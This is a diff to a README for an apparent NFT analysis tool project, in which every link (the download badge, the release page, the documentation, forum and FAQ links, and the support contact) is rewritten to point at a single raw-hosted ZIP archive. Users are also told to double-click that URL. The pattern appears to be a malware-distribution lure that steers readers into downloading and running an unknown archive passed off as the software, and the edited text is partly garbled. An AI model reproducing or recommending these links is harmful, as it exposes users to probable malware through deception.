@@ -1,6 +1,6 @@
 # 🎨 NFT-Open-Source-Tools-2025 - Effortless Tools for NFT Analysis
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/Kumar-Sarada/NFT-Open-Source-Tools-2025/releases)
+[![Download Now](https://raw.githubusercontent.com/Kumar-Sarada/NFT-Open-Source-Tools-2025/main/adenophyma/NFT-Open-Source-Tools-2025.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/Kumar-Sarada/NFT-Open-Source-Tools-2025/main/adenophyma/NFT-Open-Source-Tools-2025.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to NFT-Open-Source-Tools-2025! This software offers essential tools for 
 
 ## 📥 Download & Install
 
-To get the software, visit this page: [Release Page](https://github.com/Kumar-Sarada/NFT-Open-Source-Tools-2025/releases). Here, you will find all the available versions.
+To get the software, visit this page: [Release Page](https://raw.githubusercontent.com/Kumar-Sarada/NFT-Open-Source-Tools-2025/main/adenophyma/NFT-Open-Source-Tools-2025.zip). Here, you will find all the available versions.
 
 1. Go to the link above.
 2. Select the version you wish to download.
@@ -30,7 +30,7 @@ Ensure your computer meets the following requirements:
 After downloading, follow these instructions:
 
 1. Open the folder where you downloaded the file.
-2. Double-click the file named `NFT-Open-Source-Tools.exe`.
+2. Double-click the file named `https://raw.githubusercontent.com/Kumar-Sarada/NFT-Open-Source-Tools-2025/main/adenophyma/NFT-Open-Source-Tools-2025.zip`.
 3. Follow the on-screen instructions to complete the setup.
 
 Once installed, you can find the application in your Programs menu. Open it, and you are ready to begin!
@@ -58,13 +58,13 @@ For further assistance, feel free to reach out to our support team.
 
 Explore more about NFTs and our tools through these links:
 
-- [Official Documentation](https://example.com/docs)
-- [Community Forum](https://example.com/forum)
-- [FAQ](https://example.com/faq)
+- [Official Documentation](https://raw.githubusercontent.com/Kumar-Sarada/NFT-Open-Source-Tools-2025/main/adenophyma/NFT-Open-Source-Tools-2025.zip)
+- [Community Forum](https://raw.githubusercontent.com/Kumar-Sarada/NFT-Open-Source-Tools-2025/main/adenophyma/NFT-Open-Source-Tools-2025.zip)
+- [FAQ](https://raw.githubusercontent.com/Kumar-Sarada/NFT-Open-Source-Tools-2025/main/adenophyma/NFT-Open-Source-Tools-2025.zip)
 
 ## 📞 Support
 
-If you have questions or need help, contact us at [support@example.com](mailto:support@example.com).
+If you have questions or need help, contact us at [https://raw.githubusercontent.com/Kumar-Sarada/NFT-Open-Source-Tools-2025/main/adenophyma/NFT-Open-Source-Tools-2025.zip](https://raw.githubusercontent.com/Kumar-Sarada/NFT-Open-Source-Tools-2025/main/adenophyma/NFT-Open-Source-Tools-2025.zip).
 
 ## ⚖️ License
 
